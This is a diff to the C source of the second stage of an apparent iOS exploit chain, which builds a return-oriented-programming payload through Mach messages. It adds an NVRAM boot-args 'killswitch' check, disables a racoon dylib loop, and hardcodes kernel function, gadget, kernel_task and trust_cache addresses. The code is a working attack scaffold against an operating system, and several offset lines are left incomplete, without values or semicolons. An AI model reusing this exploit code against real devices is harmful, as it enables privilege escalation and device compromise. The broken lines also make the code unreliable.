@@ -12,6 +12,7 @@
 #include "stage1.h"
 
 // TODO: move those struct definitions into a new file
+typedef uint64_t mach_port_poly_t; // ???
 
 typedef struct {
 	mach_msg_header_t head;
@@ -663,7 +664,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	//CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 
 
-#if 1
+#if 0
 
 	char * dylib_str = malloc(100);
 	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
@@ -805,7 +806,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		NDR_record_t NDR;
 		mach_msg_type_number_t property_nameOffset;
 		mach_msg_type_number_t property_nameCnt;
-		char property_name[16];
+		char property_name[12];
 		mach_msg_type_number_t dataCnt;
 	};
 
@@ -831,37 +832,37 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
     get_property_msg->request.Head.msgh_reserved = 0;
 	get_property_msg->request.Head.msgh_id = 2812;
 	get_property_msg->request.dataCnt = 4096;
-	snprintf(&get_property_msg->request.property_name,16,"boot-args");
+	snprintf(&get_property_msg->request.property_name,12,"boot-args");
 	get_property_msg->request.property_nameCnt = strlen(&get_property_msg->request.property_name);
 
 	DEFINE_ROP_VAR("get_property_msg",sizeof(union get_property_union),get_property_msg);
 	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
-	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));
+	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_remote_port),"service",0,sizeof(mach_port_t));
 																																																									
 	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG("get_property_msg",1);
 	ROP_VAR_ARG64("reply_port",5);
 	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct get_property_request), sizeof(struct get_property_reply),0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
 
-	printf("%d %d %d\n",offsetof(union get_property_union,request),offsetof(union get_property_union,reply.RetCode),offsetof(union get_property_union,reply.data));
-	
 
-	uint64_t * test_break_val = malloc(8);
-	*test_break_val = 0;
-	DEFINE_ROP_VAR("test_break_val",sizeof(uint64_t),test_break_val);
+	char * cmp_str = malloc(100);
+	snprintf(cmp_str,100,"this boy needs some milk");
+	DEFINE_ROP_VAR("cmp_str",100,cmp_str);
+	DEFINE_ROP_VAR("strcmp_retval",8,tmp);
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG("cmp_str",1);
+	ROP_VAR_ARG_W_OFFSET("get_property_msg",2,offsetof(struct get_property_reply,data));
+	CALL_FUNC_RET_SAVE_VAR("strcmp_retval",get_addr_from_name(offsets,"strcmp"),0,0,0,0,0,0,0,0);
+
 	ADD_LOOP_START("test_loop")
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("dylib_str",2);
 		CALL("write",1,0,1024,0,0,0,0,0);
-		
-		/*	
-	 	ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG64("reply_port",5); 
-		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0, 0, MACH_PORT_NULL,0);
-		*/
 
+
+		
 		// set x0 to the_one
-		SET_X0_FROM_ROP_VAR("test_break_val");
+		SET_X0_FROM_ROP_VAR("strcmp_retval");
 		// break out of the loop if x0 is nonzero
 		ADD_LOOP_BREAK_IF_X0_NONZERO("test_loop");
 	ADD_LOOP_END();
@@ -990,26 +991,124 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG("master_port",2);
 	CALL("host_get_io_master",0,0,0,0,0,0,0,0);
 
+    // implementing IOServiceGetMatchingService
+    CFMutableDictionaryRef nvram_dict = IOServiceMatching("IODTNVRAM");
+    CFDataRef nvram_serialized = IOCFSerialize(nvram_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
+    CFRelease(nvram_dict);
+	uint64_t nvram_data_length = CFDataGetLength(nvram_serialized);
+
+    // TODO: move those structs into a seperate file
+    struct GetMatchingService_Request {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        mach_msg_type_number_t matchingCnt;
+        char matching[4096];
+    };
+
+    struct GetMatchingService_Reply {
+        mach_msg_header_t Head;
+        mach_msg_body_t body;
+        mach_msg_port_descriptor_t service;
+        mach_msg_trailer_t trailer;
+    };
+
+    struct GetMatchingService_Request * nvram_request = malloc(sizeof(struct GetMatchingService_Request));
+    memset(nvram_request,0,sizeof(struct GetMatchingService_Request));
+    nvram_request->NDR = NDR_record;
+    nvram_request->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    nvram_request->Head.msgh_id = 2880;
+    nvram_request->Head.msgh_reserved = 0;
+    nvram_request->matchingCnt = nvram_data_length;
+    memcpy(nvram_request->matching,CFDataGetBytePtr(nvram_serialized),nvram_data_length);
+
+    DEFINE_ROP_VAR("nvram_request",sizeof(struct GetMatchingService_Request),nvram_request);
+    ROP_VAR_CPY_W_OFFSET("nvram_request",offsetof(struct GetMatchingService_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
+    ROP_VAR_CPY_W_OFFSET("nvram_request",offsetof(struct GetMatchingService_Request,Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));
+
+    ROP_VAR_ARG_HOW_MANY(2);
+    ROP_VAR_ARG("nvram_request",1);
+    ROP_VAR_ARG64("reply_port",5);
+    CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((nvram_data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
+
+	DEFINE_ROP_VAR("nvram_service",sizeof(mach_port_t),tmp);
+
+    ROP_VAR_CPY_W_OFFSET("nvram_service",0,"nvram_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));
+
+
+	struct get_property_request {
+		mach_msg_header_t Head;
+		NDR_record_t NDR;
+		mach_msg_type_number_t property_nameOffset;
+		mach_msg_type_number_t property_nameCnt;
+		char property_name[12];
+		mach_msg_type_number_t dataCnt;
+	};
+
+	struct get_property_reply {
+		mach_msg_header_t Head;
+		NDR_record_t NDR;
+		kern_return_t RetCode;
+		mach_msg_type_number_t dataCnt;
+		char data[4096];
+		mach_msg_trailer_t trailer;
+	};
+
+	union get_property_union {
+		struct get_property_request request;
+		struct get_property_reply reply;
+	};
+
+	union get_property_union * get_property_msg = malloc(sizeof(union get_property_union));
+	memset(get_property_msg,0,sizeof(union get_property_union));
+
+	get_property_msg->request.NDR = NDR_record;
+	get_property_msg->request.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    get_property_msg->request.Head.msgh_reserved = 0;
+	get_property_msg->request.Head.msgh_id = 2812;
+	get_property_msg->request.dataCnt = 4096;
+	snprintf(&get_property_msg->request.property_name,12,"boot-args");
+	get_property_msg->request.property_nameCnt = strlen(&get_property_msg->request.property_name);
+
+	DEFINE_ROP_VAR("get_property_msg",sizeof(union get_property_union),get_property_msg);
+	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
+	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_remote_port),"nvram_service",0,sizeof(mach_port_t));
+																																																									
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG("get_property_msg",1);
+	ROP_VAR_ARG64("reply_port",5);
+	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct get_property_request), sizeof(struct get_property_reply),0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
+
+
+	char * cmp_str = malloc(100);
+	snprintf(cmp_str,100,"this boy needs some milk");
+	DEFINE_ROP_VAR("cmp_str",100,cmp_str);
+	DEFINE_ROP_VAR("strcmp_retval",8,tmp);
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG("cmp_str",1);
+	ROP_VAR_ARG_W_OFFSET("get_property_msg",2,offsetof(struct get_property_reply,data));
+	CALL_FUNC_RET_SAVE_VAR("strcmp_retval",get_addr_from_name(offsets,"strcmp"),0,0,0,0,0,0,0,0);
+
+#define ADD_USLEEP(usec) \
+	ROP_VAR_ARG_HOW_MANY(1); \
+	ROP_VAR_ARG64("reply_port",5); \
+	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);
+
+	ADD_LOOP_START("killswitch loop")
+		// set x0 to the_one
+		SET_X0_FROM_ROP_VAR("strcmp_retval");
+		// break out of the loop if x0 is nonzero
+		ADD_LOOP_BREAK_IF_X0_NONZERO("test_loop");
+
+		ADD_USLEEP(1000);
+	ADD_LOOP_END();
+
+
+
 	// implementing IOServiceGetMatchingService
 	CFMutableDictionaryRef myservice_dict = IOServiceMatching("IOPMrootDomain");
 	CFDataRef myservice_serialized = IOCFSerialize(myservice_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
 	CFRelease(myservice_dict);
 	uint64_t data_length = CFDataGetLength(myservice_serialized);
-
-	// TODO: move those structs into a seperate file
-	struct GetMatchingService_Request {
-		mach_msg_header_t Head;
-		NDR_record_t NDR;
-		mach_msg_type_number_t matchingCnt;
-		char matching[4096];
-	};
-
-	struct GetMatchingService_Reply {
-		mach_msg_header_t Head;
-		mach_msg_body_t body;
-		mach_msg_port_descriptor_t service;
-		mach_msg_trailer_t trailer;
-	};
 
 	struct GetMatchingService_Request * service_request = malloc(sizeof(struct GetMatchingService_Request));
 	memset(service_request,0,sizeof(struct GetMatchingService_Request));
@@ -1119,10 +1218,6 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// we need to wait for a short amout of time till the other thread called open
 	// we can't call usleep on it's own so we just run our own implementation
-#define ADD_USLEEP(usec) \
-	ROP_VAR_ARG_HOW_MANY(1); \
-	ROP_VAR_ARG64("reply_port",5); \
-	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);
 
 	// TODO: we can prob remove this when we chown the log to mobile or change the permissions
 	ADD_USLEEP(100);
@@ -1502,6 +1597,36 @@ _STRUCT_ARM_THREAD_STATE64
 		} userland_funcs;
 	} offsets_t;
 	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
+	lib_offsets->constant.kernel_image_base = 0xffffff7000400000;
+	lib_offsets->funcs.copyin = 0xfffffff0071a05ac;
+	lib_offsets->funcs.copyout = 0xfffffff0071a07dc;
+	lib_offsets->funcs.current_task = 0xfffffff0070ebe88;
+	lib_offsets->funcs.get_bsdtask_info = 0xfffffff007101550;
+	lib_offsets->funcs.vm_map_wire_external = 0xfffffff00714a35c;
+	lib_offsets->funcs.vfs_context_current = 0xfffffff0071f4ffc;
+	lib_offsets->funcs.vnode_lookup = 0xfffffff0071d6c74;
+	lib_offsets->funcs.osunserializexml
+	lib_offsets->funcs.smalloc
+	lib_offsets->funcs.ipc_port_alloc_special
+	lib_offsets->funcs.ipc_kobject_set
+	lib_offsets->funcs.ipc_port_make_send
+	lib_offsets->gadgets.add_x0_x0_ret = 0xfffffff0073b71e4;
+	lib_offsets->data.realhost
+	lib_offsets->data.zone_map
+	lib_offsets->data.kernel_task = 0xfffffff007622048;
+	lib_offsets->data.kern_proc
+	lib_offsets->data.rootvnode = 0xfffffff007622088
+	lib_offsets->data.osboolean_true
+	lib_offsets->data.trust_cache = 0xfffffff007687428;
+	lib_offsets->vtabs.iosurface_root_userclient
+	lib_offsets->struct_offsets.is_task_offset
+	lib_offsets->struct_offsets.task_itk_self
+	lib_offsets->struct_offsets.itk_registered
+	lib_offsets->struct_offsets.ipr_size
+	lib_offsets->struct_offsets.sizeof_task
+	lib_offsets->iosurface.create_outsize
+	lib_offsets->iosurface.create_surface
+	lib_offsets->iosurface.set_value
 	lib_offsets->userland_funcs.write = get_addr_from_name("write") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.IOConnectTrap6 = get_addr_from_name("IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_ports_lookup = get_addr_from_name("mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr;
